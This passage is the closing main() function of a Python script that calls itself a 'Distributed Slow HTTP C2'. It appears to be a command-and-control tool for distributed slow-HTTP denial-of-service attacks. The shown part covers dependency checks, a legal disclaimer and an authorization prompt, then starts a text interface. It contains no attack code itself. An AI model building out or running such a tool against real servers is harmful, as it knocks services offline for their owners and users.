        from cryptography.fernet import Fernet
        import colorama
    except ImportError as e:
        print(f"Missing dependency: {e}")
        print("Please install: pip install paramiko cryptography colorama")
        sys.exit(1)
    
    # Create necessary directories
    os.makedirs('logs', exist_ok=True)
    os.makedirs('config', exist_ok=True)
    
    # Legal disclaimer
    print(f"""
{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════╗
║                               LEGAL NOTICE                                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ This tool is for EDUCATIONAL and AUTHORIZED PENETRATION TESTING ONLY        ║
║ Unauthorized use against systems you don't own is ILLEGAL                   ║
║ Users are solely responsible for compliance with applicable laws             ║
║                                                                              ║
║ By proceeding, you acknowledge proper authorization and legal compliance     ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

""")
    
    confirm = input(f"{Colors.YELLOW}Do you have proper written authorization? (yes/no): {Colors.RESET}").strip().lower()
    if confirm not in ['yes', 'y']:
        print(f"{Colors.RED}Authorization required. Exiting.{Colors.RESET}")
        sys.exit(0)
    
    # Initialize and run TUI
    try:
        print("Starting Distributed Slow HTTP C2 - Complete Fixed Edition...")
        tui = SlowHTTPTUI()
        tui.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
